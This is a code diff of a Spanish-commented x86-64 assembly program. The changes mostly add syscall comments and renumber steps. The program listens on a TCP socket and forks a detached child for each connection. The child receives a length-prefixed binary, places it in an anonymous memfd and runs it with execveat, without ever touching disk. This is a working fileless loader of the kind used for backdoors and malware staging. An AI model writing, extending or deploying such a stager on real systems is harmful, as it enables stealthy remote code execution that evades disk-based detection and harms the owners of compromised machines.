@@ -3,6 +3,7 @@ section .data
     memfd_name db '', 0    ; Nombre del memfd
     exec_path db '', 0     ; Empty path para que execveat ejecute FD
 
+    ; Argumentos para definir las propiedades del socket
     ; struct sockaddr_in (16 bytes)
     sockaddr_in:
         dw 2                ; sin_family = AF_INET
@@ -10,6 +11,7 @@ section .data
         dd 0x0100007F       ; sin_addr = 127.0.0.1 (big-endian: 0x7f000001 → bytes 01 00 00 7F)
         dq 0                ; sin_zero (padding)
 
+    ; Argumentos para definir el clonado del proceso
     ; struct clone_args (88 bytes)
     clone_args:
         dq 0                ; flags     CLONE_PIDFD = 0x00001000
@@ -30,6 +32,8 @@ section .text
 
 global _start
 _start: 
+
+; 1 - Creación del socket en modo escucha
 
     ; SOCKET
     mov rax, 41   ; Número de syscall (socket)
@@ -73,16 +77,16 @@ accept_loop:
 ; 2 - Creación del proceso hijo y desvinculación del padre
 
     ; CLONE3
-    mov rax, 435
-    lea rdi, [rel clone_args]
-    mov rsi, 88
+    mov rax, 435                  ; Número de syscall (clone3)
+    lea rdi, [rel clone_args]     ; Puntero a struct clone_args
+    mov rsi, 88                   ; Tamaño de la estructura clone_args
     syscall
 
     cmp rax, 0
     jg accept_loop
 
     ; SETSID
-    mov rax, 112
+    mov rax, 112    ; Número de syscall (setsid)
     syscall
 
 
@@ -96,7 +100,7 @@ recv_lg:
     add r15, rax
 
     ;RECVFROM
-    mov rax, 45             ; Puntero a socklen_t con el tamaño del buffer addr (o NULL)
+    mov rax, 45             ; Número de syscall (recvfrom)
     mov rdi, r13            ; Descriptor del socket
     lea rsi, [rel buff_lg]  ; Dirección del buffer donde almacenar datos
     add rsi, r15
@@ -111,7 +115,7 @@ recv_lg:
     jg recv_lg
 
 
-; 3 - Creación del fichero en tempfs por parte del hijo
+; 4 - Creación del fichero en tempfs por parte del hijo
 
     ;MEMFD_CREATE
     mov rax, 319                   ; Número de syscall (memfd_create)
@@ -124,12 +128,12 @@ recv_lg:
     ; --------------------------------
 
 
-; 4 - Preexpanción del fichero en tempfs al tamaño necesario (relleno a 0)
+; 5 - Preexpanción del fichero en tempfs al tamaño necesario (relleno a 0)
 
     ; FTRUNCATE
-    mov rax, 77
-    mov rdi, r14
-    mov rsi, [buff_lg]
+    mov rax, 77              ; Número de syscall (ftruncate)
+    mov rdi, r14             ; Descriptor de archivo
+    mov rsi, [buff_lg]       ; Nuevo tamaño en bytes
     syscall
 
 ; mmap con MAP_SHARED sobre un fd mapea páginas reales del fichero. 
@@ -137,7 +141,7 @@ recv_lg:
 ; ftruncate preexpande el fichero al tamaño necesario, reservando esas páginas en tmpfs, 
 ; para que mmap tenga algo concreto sobre lo que operar. 
 
-; 4 - Crear región de memoria compartida entre el proceso hijo y el fichero en tempfs
+; 6 - Crear región de memoria compartida entre el proceso hijo y el fichero en tempfs
 
     ;MMAP
     mov rax, 9          ; Número de syscall (mmap)
@@ -150,7 +154,7 @@ recv_lg:
     syscall
 
 
-; 5 - Se escribe el contenido recibido en la región de memoria compartida
+; 7 - Se escribe el contenido recibido en la región de memoria compartida
 
     xor r12, r12
     mov r12, rax   ; RAX - Contiene la dirección base del bloque de memoria reservado
@@ -162,7 +166,7 @@ recv_all:
     add r15, rax
 
     ;RECVFROM
-    mov rax, 45           ; Puntero a socklen_t con el tamaño del buffer addr (o NULL)
+    mov rax, 45           ; Número de syscall (recvfrom)
     mov rdi, r13          ; Descriptor del socket
     mov rsi, r12          ; Dirección del buffer donde almacenar datos
     add rsi, r15
@@ -176,16 +180,16 @@ recv_all:
     cmp rax, 0
     jg recv_all
 
-; 6 - Se desvincula al proceso hijo de la región de memoria compartida
+; 8 - Se desvincula al proceso hijo de la región de memoria compartida
 
     ; MUNMAP
-    mov rax, 11
-    mov rdi, r12
-    mov rsi, [buff_lg]
+    mov rax, 11          ; Número de syscall (munmap)
+    mov rdi, r12         ; Dirección base del mapping a eliminar
+    mov rsi, [buff_lg]   ; Tamaño en bytes a desmapear
     syscall
 
 
-; 7 - Se ejecuta el contenido del fichero en tempfs
+; 9 - Se ejecuta el contenido del fichero en tempfs
 
     ;EXECVEAT
     mov rax, 322              ; Número de syscall (execveat)
@@ -202,4 +206,5 @@ exit:
     mov rax, 60
     xor rdi, rdi  
     syscall
+
 
